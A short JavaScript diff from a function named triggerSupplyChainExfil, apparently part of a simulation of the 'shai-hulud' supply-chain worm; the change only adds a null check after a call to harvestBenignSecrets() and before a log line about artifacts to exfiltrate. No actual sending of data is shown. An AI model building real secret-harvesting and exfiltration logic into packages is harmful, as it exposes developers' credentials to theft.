@@ -21,8 +21,8 @@ export async function triggerSupplyChainExfil() {
   console.log('[shai-hulud] Supply chain payload triggered within request context');
   
   const artifacts = harvestBenignSecrets();
-  
-  if (artifacts.empty) {
+
+  if (!artifacts || artifacts.empty) {
     console.log('[shai-hulud] No artifacts found to exfiltrate');
     return { 
       success: true, 
